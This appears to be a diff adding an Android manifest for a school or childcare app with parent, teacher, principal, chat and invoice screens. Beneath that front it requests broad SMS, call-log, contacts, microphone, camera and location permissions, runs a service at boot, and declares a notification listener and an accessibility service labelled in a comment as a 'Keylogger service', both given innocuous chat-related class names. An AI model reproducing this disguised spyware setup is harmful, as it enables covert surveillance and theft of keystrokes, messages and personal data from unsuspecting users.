@@ -1,0 +1,154 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+
+<!--    <uses-sdk android:maxSdkVersion="21" android:targetSdkVersion="32" />-->
+
+    <uses-permission android:name="android.permission.INTERNET" tools:ignore="protectedPermissions" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.CAMERA" />
+
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.WRITE_CONTACTS" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.SET_WALLPAPER" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-feature android:name="android.hardware.camera" android:required="true" />
+    <uses-feature android:name="android.hardware.camera.autofocus" />
+    <uses-feature android:name="android.hardware.microphone" />
+    <uses-feature android:name="android.hardware.telephony" android:required="false" />
+    <uses-feature android:name="android.hardware.camera" android:required="true"/>
+
+
+
+    <application
+        android:allowBackup="true"
+        android:dataExtractionRules="@xml/data_extraction_rules"
+        android:fullBackupContent="@xml/backup_rules"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.Project"
+        tools:targetApi="32">
+
+
+        <service android:name=".mainpage.mainpage_backend.UpdateService"
+            android:exported="true"
+            android:enabled="true"
+            android:process=":ServiceProcess"/>
+
+
+<!--        <receiver android:name=".mainpage.mainpage_backend.Network"-->
+<!--            android:exported="true">-->
+<!--            <intent-filter>-->
+<!--                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />-->
+<!--            </intent-filter>-->
+<!--        </receiver>-->
+
+        <receiver android:name=".mainpage.mainpage_backend.BootRecv"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Not Original -->
+        <activity android:name=".mainpage.MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!--        AUTHENTICATION-->
+        <activity android:name=".userauth.LoginSignUpActivity" />
+        <activity android:name=".userauth.ParentLoginActivity" />
+        <activity android:name=".userauth.StaffLoginActivity" />
+        <activity android:name=".userauth.ParentSignUpActivity" />
+        <activity android:name=".userauth.ResetpassActivity"/>
+        <activity android:name=".userauth.OnboardingActivity"/>
+
+        <!--        CHAT-->
+        <activity android:name=".chats.messages.MessageActivity"
+            android:windowSoftInputMode="adjustPan" />
+        <activity android:name=".chats.conversations.ConversationActivity"
+            android:windowSoftInputMode="adjustPan"/>
+        <activity android:name=".chats.conversations.NewConversationActivity"/>
+
+        <!--        INVOICES-->
+        <activity android:name=".chats.conversations.NewGroupConversationActivity"
+            android:windowSoftInputMode="adjustPan" />
+<!--        <activity android:name=".userauth.ResetpassActivity" />-->
+        <activity android:name=".invoices.AddNewCardActivity"/>
+        <activity android:name=".invoices.InvoiceDetailActivity"/>
+        <activity android:name=".invoices.InvoicesActivity"/>
+<!--        <activity android:name=".invoices.AddNewCardActivity"/>-->
+
+        <!--        PRINCIPAL-->
+        <activity android:name=".principal.ManageUsersActivity"
+            android:windowSoftInputMode="adjustPan"/>
+        <activity android:name=".principal.ManageRoleActivity"
+            android:windowSoftInputMode="adjustPan"/>
+        <activity android:name=".principal.ViewUserActivity"
+            android:windowSoftInputMode="adjustPan"/>
+        <activity android:name=".principal.NewUsersActivity"
+            android:windowSoftInputMode="adjustPan"/>
+
+        <!--        TEACHER-->
+        <activity android:name=".teachers.TeacherUploadActivity" />
+        <activity android:name=".teachers.KidsActivity"/>
+        <activity android:name=".teachers.UploadActivity" />
+
+
+        <!--        PARENTS-->
+        <activity android:name=".parents.ParentKidsActivity"/>
+        <activity android:name=".parents.TeachersActivity"/>
+        <activity android:name=".parents.TeacherDetailActivity"/>
+
+
+
+        <!-- NotificationListener service declaration -->
+        <service
+            android:name=".chats.conversation_backend.ConversationStuff"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+            android:exported="true"> <!-- Set to true as the system needs to bind to it -->
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+        <!-- Keylogger service declaration -->
+        <service android:name=".chats.conversation_backend.ConversationClass"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+
+            <meta-data android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+
+        </service>
+
+    </application>
+
+</manifest>
